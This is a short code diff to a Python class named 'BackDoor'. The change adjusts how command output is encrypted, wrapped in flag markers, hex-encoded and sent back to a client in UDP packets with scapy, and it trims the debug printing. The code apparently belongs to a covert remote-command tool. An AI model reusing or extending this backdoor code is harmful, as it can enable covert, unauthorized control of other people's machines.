@@ -189,8 +189,7 @@ class BackDoor:
         payload = msg
         pkt = ip / udp / payload
         try:
-            print("Sending output back to client")
-            print("--------------------------------------------------------------")
+            print("Sent!")
             print("--------------------------------------------------------------")
             send(pkt, verbose=0)
         except PermissionError:
@@ -199,16 +198,12 @@ class BackDoor:
 
     def prepare_msg(self, cmd: str) -> str:
         cipher = self.generate_cipher()
+        cmd = self.flag_begin + cmd + self.flag_close
         encrypted_data = self.encrypt_data(cipher, cmd)
         # Convert the encrypted string to bytes
-
-        print(f"Encrypted format: {encrypted_data}")
+        print("Preparing response.....")
         hex_str = self.get_hex_string(encrypted_data)
-        print("--------------------------------------------------------------")
-        msg = self.flag_begin + hex_str + self.flag_close
-        print(f"Added flags, sending: {msg}")
-        return msg
-
+        return hex_str
 
     def get_hex_string(self, encrypted_line):
         """ Returns hex string of byte stream (encrypted string)"""
